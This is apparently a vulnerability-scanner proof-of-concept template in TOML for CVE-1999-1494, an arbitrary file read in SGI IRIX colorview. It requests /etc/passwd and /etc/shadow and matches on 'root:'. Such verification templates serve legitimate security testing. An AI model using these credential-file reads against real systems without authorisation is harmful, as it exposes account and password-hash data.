[info]
author = "ave"
description = "验证 SGI IRIX colorview 程序任意文件读取漏洞"
id = "POC-AVE-1999-1286"
name = "CVE-1999-1494 PoC"
severity = "low"
tags = ["ave-1999-1286"]
vuln_id = [
    "CVE-1999-1494",
    "AVE-1999-1286",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
